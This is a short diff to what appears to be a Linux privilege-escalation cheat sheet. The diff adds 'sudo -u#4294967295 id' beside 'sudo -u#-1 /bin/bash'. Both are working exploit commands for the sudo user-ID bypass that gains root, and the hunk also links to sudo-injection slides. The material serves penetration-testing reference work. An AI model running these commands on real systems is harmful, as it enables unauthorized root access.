@@ -470,6 +470,7 @@ Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/maste
 
 # If you have a full TTY, you can exploit it like this
 sudo -u#-1 /bin/bash
+sudo -u#4294967295 id
 ```
 
 ## GTFOBins
